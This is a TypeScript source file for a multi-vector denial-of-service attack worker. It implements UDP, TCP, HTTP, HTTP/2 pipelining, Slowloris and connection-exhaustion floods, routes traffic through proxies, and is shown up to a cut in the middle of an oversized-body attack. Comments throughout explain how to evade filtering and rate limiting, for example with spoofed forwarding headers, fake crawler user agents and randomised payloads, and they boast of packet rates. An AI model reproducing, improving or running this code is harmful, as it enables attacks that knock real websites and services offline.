/**
 * ATTACK WORKER — runs in a worker_thread, owns its own event loop
 *
 * Receives attack config via workerData, fires all vectors,
 * and posts stats back to parent every 300ms.
 * Stops when parent sends "stop" message.
 */
import { parentPort, workerData } from "worker_threads";
import net from "node:net";
import tls from "node:tls";
import http from "node:http";
import dgram from "node:dgram";
import dns from "node:dns/promises";

// ── Types ─────────────────────────────────────────────────────────────────
interface ProxyConfig { host: string; port: number; }
interface WorkerConfig {
  method:   string;
  target:   string;
  port:     number;
  threads:  number;    // this worker's share of total threads
  proxies?: ProxyConfig[];
}

// ── Helpers ───────────────────────────────────────────────────────────────
const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a));
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
const UA_POOL  = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  "curl/8.7.1", "python-requests/2.32.3", "Go-http-client/2.0",
  "axios/1.7.2", "node-fetch/3.3.2",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
];
const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/login", "/admin/",
  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
  "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
  "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
  "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
];
const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];

// DNS resolution cache
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch { return hostname; }
}

// ── Headers builder ───────────────────────────────────────────────────────
function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const cookieCount = randInt(8, 20);
  const cookie = Array.from({length: cookieCount}, () =>
    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
  ).join("; ");

  const h: Record<string, string> = {
    "User-Agent":           randUA(),
    "Accept":               randInt(0,2) === 0 ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":      ["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9","de-DE,de;q=0.9"][randInt(0,4)],
    "Accept-Encoding":      "gzip, deflate, br, zstd",
    "Cache-Control":        "no-cache, no-store, must-revalidate",
    "Pragma":               "no-cache",
    "Connection":           Math.random() < 0.6 ? "close" : "keep-alive",
    "X-Forwarded-For":      `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":            randIp(),
    "True-Client-IP":       randIp(),
    "CF-Connecting-IP":     randIp(),
    "X-Originating-IP":     randIp(),
    "X-Remote-IP":          randIp(),
    "Forwarded":            `for=${randIp()};proto=https`,
    "Cookie":               cookie,
    "Authorization":        `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
    "X-CSRF-Token":         randHex(32),
    "X-Request-ID":         `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
    "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
    "Sec-Fetch-Dest":       "document",
    "Sec-Fetch-Mode":       "navigate",
    "Sec-Fetch-Site":       "cross-site",
    "Sec-CH-UA":            `"Chromium";v="125", "Not.A/Brand";v="24"`,
    "Sec-CH-UA-Platform":   `"Windows"`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

function buildUrl(base: string): string {
  try {
    const u = new URL(base);
    if (Math.random() < 0.65) u.pathname = hotPath();
    else {
      const depth = randInt(1, 5);
      u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,10))).join("/");
    }
    u.searchParams.set("_",    Date.now().toString(36) + randStr(6));
    u.searchParams.set("v",    String(randInt(1, 99999999)));
    u.searchParams.set("cb",   String(Math.random()));
    if (Math.random() < 0.45) u.searchParams.set("q",   randStr(randInt(4,18)));
    if (Math.random() < 0.3)  u.searchParams.set("page", String(randInt(1, 100)));
    if (Math.random() < 0.2)  u.searchParams.set("id",  String(randInt(1, 999999)));
    return u.toString();
  } catch {
    return `${base}?_=${randStr(8)}&v=${Date.now()}`;
  }
}

function buildBody(minF = 30, maxF = 100): string {
  if (Math.random() < 0.4) {
    // JSON body — harder to filter than form-encoded
    const obj: Record<string, string | number> = {};
    for (let i = 0; i < randInt(minF, maxF); i++) {
      obj[randStr(randInt(4,10))] = randInt(0, 2) === 0 ? randInt(0, 999999) : randStr(randInt(8,48));
    }
    return JSON.stringify(obj);
  }
  return Array.from({length: randInt(minF, maxF)},
    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,56))}`
  ).join("&");
}

// Pre-built heavy body pool (10-64KB each, rebuilt continuously)
const HEAVY_POOL: string[] = [];
function buildHeavy(): string {
  const target = randInt(10240, 65536);
  const isJson = Math.random() < 0.35;
  if (isJson) {
    const arr: string[] = ["{"];
    let len = 1;
    while (len < target) {
      const k = randStr(randInt(4,10));
      const v = randStr(randInt(40,120));
      const part = `"${k}":"${v}",`;
      arr.push(part);
      len += part.length;
    }
    arr.push(`"_":"${randHex(8)}"}`);
    return arr.join("");
  }
  const parts: string[] = [];
  let len = 0;
  while (len < target) {
    const p = `${randStr(randInt(4,10))}=${randStr(randInt(40,120))}`;
    parts.push(p);
    len += p.length + 1;
  }
  return parts.join("&");
}
for (let i = 0; i < 32; i++) HEAVY_POOL.push(buildHeavy());
setInterval(() => {
  HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
}, 2000);
const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL UDP FLOOD
//
//  CRITICAL: concurrent socket.send() startup deadlocks in this env.
//  Sockets must be bound SEQUENTIALLY, then all run in parallel.
//
//  Achieves 130K – 500K packets/second per worker.
// ─────────────────────────────────────────────────────────────────────────
async function runUDPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // CRITICAL: max 8 sockets — more than 8 causes deadlock in this environment
  // Sockets must start SEQUENTIALLY (bind → sendNext → next socket), then run in parallel
  const numSockets = Math.max(1, Math.min(threads, 8));
  // Hit multiple ports to bypass single-port firewall rules
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port 3x
    53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
  ];
  const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const MAX_INFLIGHT = 150; // per socket — proven stable limit

  const socketDonePromises: Promise<void>[] = [];

  // Start each socket SEQUENTIALLY (bind → sendNext → start next socket)
  for (let _s = 0; _s < numSockets; _s++) {
    await new Promise<void>((bindReady) => {
      const socketDone = new Promise<void>((resolve) => {
        const sock = dgram.createSocket("udp4"); // simple string — proven stable
        sock.on("error", () => {}); // absorb all errors

        let inflight = 0;
        let closed = false;

        const forceClose = () => {
          if (!closed) {
            closed = true;
            try { sock.close(); } catch { /**/ }
            resolve();
          }
        };

        const sendNext = () => {
          if (closed) return;
          if (signal.aborted && inflight === 0) { forceClose(); return; }
          while (!closed && !signal.aborted && inflight < MAX_INFLIGHT) {
            const port   = PORTS[randInt(0, PORTS.length)];
            const pktLen = randInt(PKT_MIN, PKT_MAX);
            const buf    = Buffer.allocUnsafe(pktLen);
            // Randomize content to defeat payload-based filtering
            buf.writeUInt32BE(Date.now() >>> 0, 0);
            buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
            inflight++;
            sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
              inflight--;
              localPkts++;
              localBytes += pktLen;
              sendNext();
            });
          }
        };

        signal.addEventListener("abort", () => {
          setTimeout(forceClose, 300);
        }, { once: true });

        sock.bind(0, () => {
          sendNext();
          bindReady();
        });
      });
      socketDonePromises.push(socketDone);
    });
  }

  await Promise.all(socketDonePromises);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  PROXY REQUEST — routes HTTP through a proxy using native node:http
//  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
// ─────────────────────────────────────────────────────────────────────────
function fetchViaProxy(
  targetUrl: string, proxy: ProxyConfig,
  reqMethod: string, headers: Record<string,string>, body?: string
): Promise<number> {
  return new Promise((resolve) => {
    const timeoutMs = 5000;
    const u = new URL(targetUrl);
    const isHttps = u.protocol === "https:";
    const targetHost = u.hostname;
    const targetPort = parseInt(u.port, 10) || (isHttps ? 443 : 80);
    const reqPath = (u.pathname || "/") + (u.search || "");
    const bodyBuf = body ? Buffer.from(body) : undefined;

    const finish = (bytes: number) => resolve(bytes);
    const fail   = ()             => resolve(100);

    if (!isHttps) {
      // HTTP through proxy — send absolute URL
      const absHeaders = Object.assign({}, headers, {
        Host: targetHost,
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string | undefined>);
      // Remove undefined
      for (const k of Object.keys(absHeaders)) if (absHeaders[k] === undefined) delete absHeaders[k];

      const req = http.request({
        host: proxy.host, port: proxy.port,
        method: reqMethod, path: targetUrl,
        headers: absHeaders as Record<string,string>,
        timeout: timeoutMs,
      }, (res) => {
        const bytes = parseInt(res.headers["content-length"] || "0") || 450;
        res.resume();
        finish((bodyBuf?.length ?? 0) + bytes + 200);
      });
      req.on("error", fail);
      req.on("timeout", () => { req.destroy(); fail(); });
      if (bodyBuf) req.write(bodyBuf);
      req.end();
    } else {
      // HTTPS through CONNECT tunnel
      const sock = net.createConnection(proxy.port, proxy.host);
      const timer = setTimeout(() => { sock.destroy(); fail(); }, timeoutMs);

      sock.once("connect", () => {
        sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
        sock.once("data", (chunk) => {
          if (!chunk.toString().startsWith("HTTP/1.") || !chunk.toString().includes(" 200")) {
            clearTimeout(timer); sock.destroy(); fail(); return;
          }
          // Upgrade to TLS over the tunnel
          const secure = tls.connect({ socket: sock, servername: targetHost, rejectUnauthorized: false }, () => {
            const h = Object.assign({}, headers, {
              Host: targetHost,
              "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
            } as Record<string, string | undefined>);
            for (const k of Object.keys(h)) if (h[k] === undefined) delete h[k];
            const hdStr = Object.entries(h).map(([k,v]) => `${k}: ${v}`).join("\r\n");
            const req   = `${reqMethod} ${reqPath} HTTP/1.1\r\n${hdStr}\r\nConnection: close\r\n\r\n`;
            secure.write(req);
            if (bodyBuf) secure.write(bodyBuf);
            secure.once("data", (d) => {
              clearTimeout(timer); secure.destroy();
              finish((bodyBuf?.length ?? 0) + d.length + 200);
            });
            secure.once("error", () => { clearTimeout(timer); fail(); });
          });
          secure.on("error", () => { clearTimeout(timer); fail(); });
        });
        sock.on("error", () => { clearTimeout(timer); fail(); });
      });
      sock.on("error", () => { clearTimeout(timer); fail(); });
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP FLOOD — high-concurrency fetch with cache-busting + randomization
//  When proxies are available, 40% of requests route through proxy pool
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFlood(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const ALL_METHODS = ["GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  const MAX_INFLIGHT = Math.min(threads * 20, 5000);
  let inflight = 0;
  let proxyIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doFetch = () => {
    if (signal.aborted) return;
    inflight++;
    const method   = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody  = method === "POST" || method === "PUT" || method === "PATCH";
    const body     = hasBody ? (Math.random() < 0.3 ? getHeavy() : buildBody(30, 120)) : undefined;
    const url      = buildUrl(base);
    const headers  = buildHeaders(hasBody, body?.length);

    // Rotate through proxies for 50% of requests when proxies are available
    const useProxy = proxies.length > 0 && Math.random() < 0.5;
    if (useProxy) {
      const proxy = proxies[proxyIdx % proxies.length];
      proxyIdx++;
      fetchViaProxy(url, proxy, method, headers as Record<string,string>, body)
        .then(bytes => { inflight--; localPkts++; localBytes += bytes; })
        .catch(() => { inflight--; localPkts++; localBytes += 100; });
      return;
    }

    fetch(url, {
      method,
      headers,
      body,
      signal: AbortSignal.timeout(4000),
      redirect: "follow",
      keepalive: false,
    })
      .then(res => {
        inflight--;
        localPkts++;
        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0") || 450) + 450;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => { inflight--; localPkts++; localBytes += 100; });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doFetch(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 1));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 200)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TCP FLOOD — exhausts connection state tables
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Rotate ports to stress multiple listeners simultaneously
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port
    targetPort === 443 ? 80 : 443,
    8080, 8443, 3000, 5000, 8000, 8888,
  ];
  const MAX_INFLIGHT = Math.min(threads * 8, 3000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setNoDelay(true);
    sock.setTimeout(600);

    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 800);

    sock.once("connect", () => {
      localPkts++;
      // Send a partial/malformed HTTP request to keep the server busy
      const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
      const junk = Buffer.allocUnsafe(randInt(256, 1500));
      // Fill junk with random bytes
      for (let i = 0; i < junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
      sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
        localBytes += req.length + junk.length + 60;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 1));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 150)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP PIPELINE — raw TCP keep-alive, NO fetch() overhead
//
//  Each connection stays open and sends requests back-to-back without
//  waiting for responses (HTTP/1.1 pipelining — RFC 7230 §6.3.2).
//  The receive side is drained so flow control never blocks.
//
//  Achieves 50K – 300K req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPPipeline(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const POOL_SIZE = 256;
  const PIPELINE  = 128; // requests per write batch — more per tick for max throughput

  // Pre-build a pool of raw HTTP request buffers
  const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));

  function buildRawReq(host: string): Buffer {
    const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
    return Buffer.from([
      `GET ${path} HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${randUA()}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
      `Accept-Encoding: gzip, deflate, br`,
      `Accept-Language: en-US,en;q=0.9`,
      `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
      `X-Real-IP: ${randIp()}`,
      `CF-Connecting-IP: ${randIp()}`,
      `X-Request-ID: ${randHex(16)}`,
      `Cache-Control: no-cache, no-store`,
      `Pragma: no-cache`,
      `Referer: https://google.com/search?q=${randStr(8)}`,
      `Connection: keep-alive`,
      ``, ``,
    ].join("\r\n"));
  }

  // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
  const poolIv = setInterval(() => {
    const idx = randInt(0, POOL_SIZE);
    reqPool[idx] = buildRawReq(hostname);
  }, 40);

  const runConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const sock = net.createConnection({ host: resolvedHost, port: targetPort });
    sock.setNoDelay(true);
    sock.setTimeout(12_000);

    const pump = () => {
      if (signal.aborted) { sock.destroy(); resolve(); return; }
      let ok = true;
      for (let i = 0; i < PIPELINE; i++) {
        const buf = reqPool[randInt(0, POOL_SIZE)];
        localPkts++;
        localBytes += buf.length;
        ok = sock.write(buf);
        if (!ok) break; // backpressure — wait for drain
      }
      if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
      else sock.once("drain", pump);
    };

    sock.on("connect", pump);
    sock.on("data",    () => {}); // drain responses — keeps TCP window open
    sock.on("timeout", () => sock.destroy());
    sock.on("error",   () => resolve());
    sock.on("close",   () => {
      if (signal.aborted) resolve();
      else setTimeout(() => runConn().then(resolve), 10); // reconnect with tiny delay
    });
    signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
  });

  // Each thread maintains one persistent pipelining connection
  await Promise.all(Array.from({ length: Math.min(threads, 600) }, () => runConn()));
  clearInterval(flushIv);
  clearInterval(poolIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 FLOOD — native multiplexed H2 streams (node:http2)
//
//  Each session holds up to STREAMS_PER_SESSION concurrent H2 streams, all
//  over a single TCP+TLS connection. Far more efficient per-socket than HTTP/1.1
//  pipelining since H2 uses binary framing with true stream multiplexing.
//
//  Achieves 20K–120K req/s per worker at close RTTs.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTP2Flood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");

  const STREAMS_PER_SESSION = Math.min(128, Math.max(16, threads * 3));
  const NUM_SESSIONS        = Math.min(threads, 40);
  const connectTarget       = `https://${resolvedHost}:${targetPort}`;

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSession = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    let client: ReturnType<typeof h2connect> | null = null;
    let done      = false;
    let connected = false;
    const finish  = () => { if (!done) { done = true; resolve(); } };

    try {
      client = h2connect(connectTarget, {
        rejectUnauthorized: false,
        settings: {
          initialWindowSize:    65535 * 8,
          maxConcurrentStreams: STREAMS_PER_SESSION,
          headerTableSize:      65536,
        },
      });
    } catch { finish(); return; }

    const c        = client;
    let inflight   = 0;

    const pump = () => {
      if (signal.aborted || c.destroyed) { finish(); return; }
      while (!signal.aborted && !c.destroyed && inflight < STREAMS_PER_SESSION) {
        inflight++;
        const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
        try {
          const stream = c.request({
            ":method":       "GET",
            ":path":         path,
            ":scheme":       "https",
            ":authority":    hostname,
            "user-agent":    randUA(),
            "accept":        "*/*,text/html",
            "accept-encoding": "gzip, deflate, br",
            "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
            "x-real-ip":     randIp(),
            "cf-connecting-ip": randIp(),
            "cache-control": "no-cache, no-store",
            "pragma":        "no-cache",
            "referer":       `https://google.com/search?q=${randStr(6)}`,
            "x-request-id":  `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
          });
          stream.on("response", () => {
            localPkts++;
            localBytes += 512;
          });
          stream.on("data",  () => {}); // drain
          stream.on("error", () => { inflight--; if (!signal.aborted) setImmediate(pump); });
          stream.on("end",   () => { inflight--; if (!signal.aborted) setImmediate(pump); });
          stream.end();
        } catch { inflight--; break; }
      }
    };

    c.on("connect", () => { connected = true; pump(); });
    c.on("error",   () => {
      if (signal.aborted || !connected) { finish(); return; }
      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 200);
    });
    c.on("close",   () => {
      if (signal.aborted || !connected) { finish(); return; }
      setTimeout(() => { if (!signal.aborted) runSession().then(finish); }, 100);
    });
    signal.addEventListener("abort", () => { try { c.destroy(); } catch { /**/ } finish(); }, { once: true });
  });

  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSession()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOWLORIS — real TCP connection pool exhaustion
//
//  Opens thousands of half-open HTTP connections. Each sends a partial request
//  (no final \r\n\r\n), then trickles one fake header line every 10-25s to
//  keep the connection alive without triggering timeouts.
//
//  Exhausts the server's connection pool without sending meaningful traffic.
//  Bypasses per-request rate limits — one connection per server thread slot.
//
//  Achieves 2K–8K concurrent half-open connections.
// ─────────────────────────────────────────────────────────────────────────
async function runSlowlorisReal(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  useHttps = false,
): Promise<void> {
  const MAX_CONN = Math.min(threads * 50, 10000);
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(180_000); // 3-minute timeout — keep alive

    let keepIv:  NodeJS.Timeout | null = null;
    let settled  = false;

    const cleanup = () => {
      if (settled) return;
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      // Immediately respawn to maintain connection count
      settled = true;
      setImmediate(() => runSock().then(resolve));
    };

    const onConnected = () => {
      localPkts++;
      // Partial GET — intentionally missing the final \r\n\r\n
      const partial = [
        `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.9`,
        `Accept-Encoding: gzip, deflate`,
        `X-Forwarded-For: ${randIp()}`,
        `Connection: keep-alive`,
        `Referer: https://google.com/`,
        ``, // NO final \r\n\r\n — this is the Slowloris trick
      ].join("\r\n");

      sock.write(partial);
      localBytes += partial.length;

      // Trickle a junk header every 10-25s to prevent server timeout
      keepIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { cleanup(); return; }
        const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
        sock.write(hdr, (err) => {
          if (err) { cleanup(); return; }
          localPkts++;
          localBytes += hdr.length;
        });
      }, randInt(10_000, 25_000));
    };

    // TLS emits 'secureConnect', plain TCP emits 'connect'
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
//  Opens MAX_CONN connections, completes TLS handshake, holds them open
//  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
//  because rate limiting only applies AFTER connection is accepted and
//  request headers are parsed. We fill connection slots BEFORE any HTTP.
//  Nginx default: worker_connections 1024 × N workers = ~4096 total.
// ─────────────────────────────────────────────────────────────────────────
async function runConnFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  useHttps = false,
): Promise<void> {
  const MAX_CONN = Math.min(threads * 80, 16000);
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(90_000);

    let settled = false;
    const cleanup = () => {
      if (settled) return;
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      settled = true;
      // Small jitter before reconnect to prevent thundering herd
      setTimeout(() => runSock().then(resolve), randInt(50, 300));
    };

    const onConnected = () => {
      localPkts++;
      // Send just enough to look like a real connection but never complete the request
      // This wastes a connection slot on the server side indefinitely
      const minReq = `GET ${hotPath()} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\n`;
      sock.write(minReq);
      localBytes += minReq.length;
      // DO NOT send the final \r\n — server waits for rest of headers forever
    };

    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP EXHAUST — huge bodies to exhaust server memory / upload bandwidth
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPExhaust(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data","/graphql","/form","/register","/api/import","/api/bulk","/api/batch"];
  const METHS  = ["POST","POST","POST","PUT","PATCH","POST"];
  const MAX_INFLIGHT = Math.min(threads * 6, 800);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
